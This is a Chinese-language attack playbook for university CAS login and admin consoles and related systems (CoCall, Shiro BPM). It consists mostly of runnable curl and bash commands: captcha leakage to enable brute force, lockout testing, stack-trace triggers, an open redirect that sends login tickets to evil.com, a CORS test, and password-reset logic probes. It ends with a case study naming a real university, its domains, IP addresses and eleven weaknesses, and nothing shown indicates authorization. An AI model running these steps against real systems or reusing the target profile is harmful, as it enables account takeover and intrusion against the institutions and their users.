# CAS管理控制台漏洞挖掘模式

## 概述
很多高校使用CAS统一身份认证系统，除了用户登录页面外，还存在一个管理控制台（通常路径为 `/ly_web_casconsole/system/login!login.action`），管理控制台的安全配置往往比用户端更弱。

## 典型目标特征
- 域名: `www.xxx.cn` 或 `auth.xxx.cn`
- CAS用户端: `/lyuapServer/login`
- CAS管理控制台: `/ly_web_casconsole/system/login!login.action`
- CAS管理框架: 通常基于 Apache Struts2 + Hibernate + Spring
- CAS安全中心: `/safe/` 目录

## 高价值漏洞类型

### 1. 验证码明文泄露（中危）
CAS管理控制台的验证码生成接口直接在JSON响应中返回验证码明文值。

**检测方法:**
```bash
curl -s "https://TARGET/ly_web_casconsole/system/login!getyzm.action" | grep -oP '"rand":"[^"]*"'
```

**利用步骤:**
```bash
# 1. 获取验证码+cookie
curl -s -c /tmp/cookie.txt "https://TARGET/ly_web_casconsole/system/login!getyzm.action" | grep -oP '"rand":"\K[^"]+'
# 2. 使用获取的验证码尝试登录
curl -s -b /tmp/cookie.txt "https://TARGET/ly_web_casconsole/system/login!logincheck.action" -X POST -d "myusername=USERNAME&password=PASSWORD&captcha=CAPTCHA_VALUE"
```

**判断依据:**
- 返回 `{"result":{"message":"填写正确的帐号密码"}}` → 验证码已被接受，漏洞存在
- 返回 `{"result":{"message":"填写验证码！"}}` → 验证码未被接受

**影响:** 攻击者可绕过验证码保护，对管理后台进行暴力破解攻击。

### 2. Struts2堆栈信息泄露（中危）
错误输入触发异常时，错误页面直接暴露完整Java堆栈信息。

**检测方法:**
```bash
# 需要先获取有效验证码，然后用特殊字符触发异常
CAS_RAND=$(curl -s -c /tmp/cas.txt 'https://TARGET/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
curl -s -b /tmp/cas.txt "https://TARGET/ly_web_casconsole/system/login!logincheck.action" --data-binary "myusername=admin&password=%&captcha=$CAS_RAND"
```

**泄露信息包括:**
- 框架版本: Apache Struts2 (com.opensymphony.xwork2)
- ORM框架: Hibernate3 (org.springframework.orm.hibernate3)
- Web容器: Apache Tomcat (org.apache.catalina)
- 自定义类名和方法名
- 过滤器信息 (如 com.ly.cas.web.filter.IpFilter)

**注意:** 堆栈泄露 ≠ Struts2 RCE。S2-045/046/048/057等RCE漏洞不一定存在，需单独测试。

### 3. 默认/弱凭据尝试
管理控制台通常使用与CAS用户端不同的凭据，可能存在默认凭据。

### 4. CAS登录后开放重定向（中危）
CAS登录接口的 `service` 参数未做白名单校验，攻击者可构造恶意链接，用户登录后CAS Ticket被发送到攻击者服务器。

**检测方法:**
```bash
# 构造恶意service参数，检查登录表单action是否包含攻击者URL
curl -sk 'https://TARGET/lyuapServer/login?service=https://evil.com/steal-ticket' | grep -oP 'action="[^"]*"'
# 返回 action="/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal-ticket" 则漏洞存在
```

**利用步骤:**
1. 构造恶意链接: `https://TARGET/lyuapServer/login?service=https://evil.com/steal-ticket`
2. 诱导用户访问并登录
3. 用户登录后CAS重定向到: `https://evil.com/steal-ticket?ticket=ST-xxxxx`
4. 攻击者获取有效CAS Ticket，可访问所有接入CAS的系统
5. 使用ticket访问: `curl -sk 'https://TARGET/lyuapServer/serviceValidate?service=VALID_SERVICE&ticket=ST-xxxxx'`

**注意事项:**
- `javascript:` 协议通常被过滤，只接受 http/https
- 可尝试 `//evil.com` 或 `/\\evil.com` 等绕过方式
- Ticket有时效性，需快速使用
- 需要配合有效service使用serviceValidate验证ticket

### 5. CAS LT参数内部主机名泄露（低危）
CAS登录页面的隐藏字段 `lt` (Login Ticket) 值中可能包含CAS服务器内部主机名。

**检测方法:**
```bash
curl -sk 'https://TARGET/lyuapServer/login' | grep -oP 'name="lt" value="[^"]*"'
# 返回 LT-178628-xxx-cas01.example.org → 泄露内部主机名 cas01.example.org
```

### 6. CAS登录页内网IP/系统链接泄露（低危）
CAS登录页面HTML源码中可能包含内网IP、内部系统链接等敏感信息。

**检测方法:**
```bash
curl -sk 'https://TARGET/lyuapServer/login' | grep -oP 'href="[^"]*"'
# 检查是否包含 172.x / 10.x / 192.168.x 等内网IP
# 检查是否包含非公开系统链接（如 CoCall、内部下载服务等）
```

**常见泄露点:**
- `href="https://172.x.x.x:PORT/download"` — 内网下载服务
- `href="https://xxx.cn:65083/download"` — CoCall视频会议系统
- `href="https://cas.leaf.com/..."` — 第三方CAS集成

### 7. CAS用户枚举（低危）
CAS登录接口对存在/不存在的用户返回不同响应，可用于枚举有效用户名。

**检测方法:**
```bash
# 对比不同用户名的登录响应
curl -sk 'https://TARGET/lyuapServer/login' -X POST -d 'username=admin&password=test&lt=true&execution=e1s1&_eventId=submit' -w "\n%{http_code}"
curl -sk 'https://TARGET/lyuapServer/login' -X POST -d 'username=nonexistent&password=test&lt=true&execution=e1s1&_eventId=submit' -w "\n%{http_code}"
# 检查响应码、重定向Location、响应体差异
```

### 8. 无账号锁定机制（高危）
CAS登录接口未实现账号锁定，攻击者可无限次尝试密码。

**检测方法:**
```bash
# 连续10次使用错误密码尝试登录
for i in $(seq 1 10); do
  CAS_RAND=$(curl -s -c /tmp/cas_lock_${i}.txt 'https://TARGET/lyuapServer/login' | grep -oP 'name="execution" value="\K[^"]+')
  curl -sk -b /tmp/cas_lock_${i}.txt 'https://TARGET/lyuapServer/login' -X POST \
    -d "username=admin&password=wrongpass${i}&lt=LT-xxx&execution=${CAS_RAND}&_eventId=submit" 2>/dev/null | grep -oP '锁定|禁用|失败|剩余|次数'
done
# 如果所有响应都是"失败"且无锁定提示，则漏洞存在
```

**判断依据:**
- 所有尝试均返回"失败"，无"账号锁定"、"账户禁用"等提示 → 漏洞存在
- 返回"账号已锁定"或"请15分钟后重试" → 已有锁定机制

**利用方式:**
结合验证码明文泄露，可实现全自动化暴力破解。

### 9. 验证码客户端校验漏洞（中危）
密码找回功能的验证码在客户端JS中校验，可绕过。

**检测方法:**
```bash
# 分析密码找回页面JS逻辑
curl -sk 'https://TARGET/safe/findPassByOther.jsp' | grep -A10 'function getcode1'
# 检查是否有如下模式:
# var url = "yanzhengma.jsp?"+Math.random();
# if ((yan.toLocaleLowerCase().trim()+"") != (message.trim()+"")){
#     ZENG.msgbox.show("输入的验证码错误", 5, 3000);
```

**漏洞特征:**
- `yanzhengma.jsp` 直接返回验证码明文文本（非图片）
- JS在浏览器端比对用户输入与获取的验证码值
- 服务端接口 `checkaccountmassage.jsp` 不验证验证码

**利用步骤:**
```bash
# 1. 获取验证码明文
curl -sk 'https://TARGET/safe/yanzhengma.jsp?0.123456'
# 返回4位数字验证码（如: 3847）

# 2. 绕过客户端验证码，直接调用服务端验证接口
curl -sk 'https://TARGET/safe/checkaccountmassage.jsp' -X POST \
  -d 'account=admin&xm=test&myname=110101200001010011'
# 返回 "true" 或 "false"

# 3. 直接访问密保问题页面（跳过前面的验证）
curl -sk 'https://TARGET/safe/changepwdbyquestion.jsp?phoneType=4'
```

### 10. 密保问题校验逻辑缺陷（中危）
`checkquestionbinding.jsp` 接口对所有用户名均返回 "true"，未验证用户是否存在。

**检测方法:**
```bash
# 测试多个用户名（包括不存在的）
for user in admin test student teacher nonexistentuser12345; do
  resp=$(curl -sk 'https://TARGET/safe/checkquestionbinding.jsp' -X POST -d "account=${user}" 2>/dev/null)
  echo "$user: $resp"
done
# 如果所有用户名都返回 "true"，则逻辑缺陷存在
```

**判断依据:**
- 所有用户名（包括不存在的）均返回 "true" → 逻辑缺陷
- 存在的用户返回 "true"，不存在的返回 "false" → 正常逻辑

**影响:**
- 攻击者无法通过此接口判断用户是否存在
- 结合其他漏洞，可尝试对任意用户名进行密码重置

### 11. QR Code登录钓鱼风险（低危）
CAS QR Code登录接口可被任意调用获取UUID和QR Code图片。

**检测方法:**
```bash
# 获取QR Code
curl -sk 'https://TARGET/lyuapServer/QrCodeServlet?cmd=getQr'
# 返回: {"uuid":"xxx-xxx-xxx","content":"iVBORw0KGgo..."}

# 轮询扫码状态
curl -sk 'https://TARGET/lyuapServer/CheckScan?uuidQr=UUID值'
```

**攻击场景:**
1. 攻击者生成QR Code并嵌入钓鱼页面
2. 诱导用户扫描并登录
3. 攻击者通过CheckScan获取登录状态
4. 利用用户的会话访问系统

## 关联端点枚举
CAS管理控制台常见端点:
- `/ly_web_casconsole/system/login!login.action` - 登录页面
- `/ly_web_casconsole/system/login!getyzm.action` - 获取验证码
- `/ly_web_casconsole/system/login!logincheck.action` - 登录验证
- `/ly_web_casconsole/system/user!list.action` - 用户列表（未授权访问）
- `/ly_web_casconsole/system/main.action` - 主页

## CAS用户端相关端点
- `/lyuapServer/login` - 用户登录
- `/lyuapServer/logout` - 登出
- `/lyuapServer/serviceValidate` - CAS 2.0 ticket验证
- `/lyuapServer/p3/serviceValidate` - CAS 3.0 ticket验证
- `/lyuapServer/validate` - CAS 1.0 ticket验证
- `/lyuapServer/MsmInfo` - 短信信息
- `/lyuapServer/CreateQRcode` - 二维码生成
- `/lyuapServer/QrCodeServlet` - 二维码Servlet
- `/lyuapServer/QYWeChatLogin` - 企业微信登录
- `/lyuapServer/deskshortcut` - 桌面快捷方式
- `/lyuapServer/captcha.jsp` - 验证码图片
- `/lyuapServer/js/RSA.js` - RSA加密库（含公钥参数）
- `/lyuapServer/js/cas.js` - CAS登录逻辑

## CAS安全中心相关端点
- `/safe/index.jsp` - 安全中心首页
- `/safe/knowledge.jsp` - 知识库
- `/safe/updatepwd.jsp` - 修改密码
- `/safe/findbyquestion.jsp` - 密保找回
- `/safe/findbyemail.jsp` - 邮箱找回
- `/safe/findPassByOther.jsp` - 其他方式找回（账号+姓名+身份证+验证码）
- `/safe/checkaccountmassage.jsp` - 账号信息验证（返回true/false）
- `/safe/yanzhengma.jsp` - 安全中心验证码
- `/safe/appeal.jsp` - 账号申诉
- `/safe/image.jsp` - 验证码图片

## CoCall视频会议系统指纹 (Thunisoft华宇信息)

很多高校使用华宇信息(Thunisoft)的CoCall视频会议系统，常见部署特征:

**识别方法:**
- 端口: 非标准端口（如 65083）
- 页面标题: `CoCall`
- SSL证书Issuer: `Thunisoft CoCall SSOLogin Certificate Authority`
- SSL证书Subject: `CoCall Server`，email: `cocall@thunisoft.com`
- 下载页路径: `/download` 或 `/interface/assets/download/`
- API路径模式: `/interface/{tenant}/api/...`（需要租户名）
- 错误信息: `{"code":404,"msg":"未找到租户信息: xxx 请检查url地址"}`
- 页面注释: `@Author: ningkl` (开发人员)
- Spring Boot错误格式: `{"timestamp":"...","status":404,"error":"Not Found","path":"..."}`

**CORS漏洞测试:**
```bash
curl -sk 'https://TARGET:PORT/interface/api/login' \
  -H 'Origin: https://attacker.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: Content-Type' \
  -D -
# 检查响应头是否包含:
# access-control-allow-origin: https://attacker.com
# access-control-allow-credentials: true
```

**相关路径:**
- `/interface/` - 接口服务根（返回 "interface service"）
- `/interface/api/` - API根（需租户前缀）
- `/interface/assets/download/` - 客户端下载页
- `/update/` - 更新文件目录

**注意:** API需要租户名前缀，租户名通常为学校缩写，可通过子域名、JS文件、错误信息等推断。

## RSA加密登录模式识别
CAS登录页面使用RSA加密密码时，前端JS文件通常包含:
- `js/RSA.js` — RSA加密库
- `js/BigInt.js` — 大数运算库
- `js/Barrett.js` — Barrett模幂运算库

**提取RSA公钥:**
```bash
curl -sk 'https://TARGET/lyuapServer/login' | grep -oP 'RSAKeyPair\("[^"]*",\s*"[^"]*",\s*"[^"]*"\)'
# 返回 RSAKeyPair("010001", '', "00f0d1b6305ea6256c768f30b6a94ef6c9fa2ee0b8eea2ea5634f821925de774ac...")
# 第一个参数: 公钥指数 (010001 = 65537)
# 第三个参数: RSA模数
```

## 特定密码触发堆栈泄露（非显而易见的Struts2行为）

CAS管理控制台(Struts2)存在一个非显而易见的行为：特定数字密码会触发HTML格式的堆栈泄露页面，而普通密码返回JSON响应。这与用`%`特殊字符触发的堆栈泄露是不同的触发机制。

**触发密码（已验证）:** `123456`、`1234`、`111111`

**不触发的密码:** `password`、`admin`、`test`、`qwerty`、`letmein`、`welcome`、`monkey`、`dragon`、`master`、`000000`

**检测方法:**
```bash
# 获取验证码
CAS_RAND=$(curl -s -c /tmp/cas.txt 'https://TARGET/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
# 用123456作为密码触发堆栈泄露
curl -sk -b /tmp/cas.txt 'https://TARGET/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=123456&captcha=$CAS_RAND"
# 返回HTML格式 <title>出错了！！</title> + <pre>完整堆栈</pre>
```

**对比正常响应:**
```bash
curl -sk -b /tmp/cas.txt 'https://TARGET/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=wrongpass&captcha=$CAS_RAND"
# 返回JSON: {"result":{"message":"填写正确的帐号密码"},...}
```

**响应差异模式（密码Oracle）:**
- 特定数字密码(123456/1234/111111) → HTML堆栈泄露页面
- 正常错误密码 → `{"result":{"message":"填写正确的帐号密码"}}`
- 某些密码(如12345678/abc123) → `{"result":{"message":"用户名或密码错误!","logmsg":"admin尝试登录 "}}`（不同错误信息，含logmsg字段）

**注意:** 所有用户名对同一密码的响应格式一致——这**不是**用户枚举漏洞，而是密码输入导致的不同代码路径。

**根因推测:** 特定数字密码可能触发Struts2类型转换器(NumberFormatException)或Hibernate验证器异常，导致`result input`结果未定义而泄露堆栈。

## 教育机构DNS枚举与攻击面发现

教育机构通常拥有大量子域名，对应不同的业务系统。DNS枚举是发现完整攻击面的关键步骤。

**高效枚举方法:**
```bash
# 教育机构常见子域名列表
for sub in www mail oa vpn ftp sso cas lib jwc news edu new old web portal api admin login auth ids idp \
  bpm cocall video meeting ims jwxt jw zhxt xtgl fwpt kfz kczy yjszs zs kyc cxcy xsc twsyb xcb \
  xcbgsgl zzb rsc jcc cwc ghc twc kycb zcc glc jsjx zx xxzx szdw tsg tyb bmb ydyh; do
  result=$(dig @8.8.8.8 +short "${sub}.TARGET_DOMAIN" A 2>/dev/null | head -1)
  [ -n "$result" ] && echo "${sub}.TARGET_DOMAIN -> $result"
done
```

**子域名到业务系统映射:**
- `jwxt/jw` → 教务系统（高价值，含学生成绩/选课）
- `zs/yjszs` → 招生系统（含考生信息）
- `tsg` → 图书馆系统
- `cocall/video/meeting` → 视频会议（通常CoCall/Thunisoft）
- `bpm` → 流程管理系统（通常含Shiro）
- `fwpt` → 服务平台
- `kyc/cxcy` → 科研/创新创业
- `xsc` → 学生处
- `kfz` → 开发者平台（可能含测试环境）
- `oa` → 办公自动化

**注意:** DNS解析到198.18.0.x范围通常表示本地DNS代理/Cloudflare WARP拦截，但连接仍可能正常工作。

## Shiro rememberMe Cookie验证技巧

当怀疑系统使用Apache Shiro时，可通过rememberMe cookie行为验证:

```bash
# 不带rememberMe → 正常响应
curl -sk 'https://TARGET/api/endpoint' -D -

# 带无效rememberMe → Shiro会返回 deleteMe
curl -sk 'https://TARGET/api/endpoint' -H 'Cookie: rememberMe=test123' -D -
# 如果返回 Set-Cookie: rememberMe=deleteMe → Shiro确认活跃

# 带deleteMe → 不再返回deleteMe（已处于删除状态）
curl -sk 'https://TARGET/api/endpoint' -H 'Cookie: rememberMe=deleteMe' -D -
```

**判断依据:**
- 返回 `Set-Cookie: rememberMe=deleteMe` → Shiro正在处理rememberMe，反序列化攻击面存在
- 不返回rememberMe相关cookie → 可能不使用rememberMe功能
- Shiro反序列化需要正确的加密密钥，常见默认密钥爆破成功率较低

## BPM系统(Shiro)测试模式

很多高校的BPM系统使用Apache Shiro + Spring Boot，常见特征:
- 网关头: `X-Application-Context: ly-gateway-server-svc:PORT`
- Session cookie: `sid=UUID格式` (如 `1c9b9618-9b10-0001-b4dd-53a6043829cc`)
- 错误信息: `org.apache.shiro.session.UnknownSessionException`
- API未认证时返回302重定向到登录页

**测试路径:**
- `/Bpmui/login` → 登录接口
- `/Bpmui/api/swagger-ui.html` → Swagger文档（可能返回500+Shiro异常）
- `/Bpmui/api/v2/api-docs` → API文档
- `/Bpmui/version.txt` → 版本信息

## 实战案例
### 新疆交通职业技术大学 (2026-06-01, 三轮深挖)
- 域名: www.xjjtedu.com / www.xjjtxy.cn / www.xjjtxy.top / www.xjjtedu.cn:65083
- CAS管理控制台: https://www.xjjtxy.cn/ly_web_casconsole/
- CAS用户端: https://www.xjjtxy.cn/lyuapServer/
- CoCall视频会议: https://www.xjjtedu.cn:65083/ (Thunisoft)
- BPM系统: https://www.xjjtxy.top/Bpmui/ (Apache Shiro, v3.3.8)
- 事务中心: https://www.xjjtxy.top/ (X-Web网关)
- DNS枚举发现50+子域名（jwxt/zs/tsg/cocall/bpm/fwpt/kyc/xsc等）
- 真实IP: 124.119.15.220 (xjjtedu.com), 124.119.15.215 (xjjtxy.cn)
- 发现漏洞(共11个):
  1. 验证码明文泄露 (getyzm.action返回rand字段) — 中危
  2. Struts2堆栈信息泄露 (特殊字符%触发) — 中危
  3. 特定密码堆栈泄露 (123456/1234/111111触发HTML错误页) — 中危
  4. CAS登录后开放重定向 (service参数注入，javascript协议被过滤) — 中危
  5. CoCall CORS配置不当 (任意源站反射+credentials:true) — 中危
  6. 内网IP泄露 (172.16.31.150:20083) — 低危
  7. LT参数内部主机名泄露 (cas01.example.org) — 低危
  8. **无账号锁定机制** (连续10次失败登录未触发锁定) — 高危
  9. **验证码客户端校验** (yanzhengma.jsp返回明文，JS在浏览器端比对) — 中危
  10. **密保校验逻辑缺陷** (checkquestionbinding.jsp对所有用户返回true) — 中危
  11. **QR Code登录钓鱼** (UUID可获取，可构造钓鱼页面) — 低危
- 技术栈: 蓝盾(Bluedon) CAS + Tomcat 7 + Hibernate 3 + Spring + Shiro + CoCall(Thunisoft)
- 关键经验:
  - Struts2 S2-045/046/048/057 RCE均未生效（堆栈泄露但不等于RCE）
  - 密码找回接口checkaccountmassage.jsp返回统一"false"，未实现用户枚举
  - CAS控制台action枚举无结果（可能路径已变更或WAF拦截）
  - CoCall API需要租户名前缀，租户名未找到（可通过JS/子域/证书推断）
  - Shiro rememberMe确认活跃但默认密钥爆破未成功
  - 198.18.0.x DNS解析可能是本地代理/WARP但连接正常
  - **无账号锁定机制**使暴力破解成为可能（结合验证码泄露）
  - **验证码客户端校验**可直接绕过（yanzhengma.jsp返回明文）
  - **密保校验逻辑缺陷**允许对任意用户名进行密码重置尝试
  - **QR Code登录接口**无频率限制，存在钓鱼风险
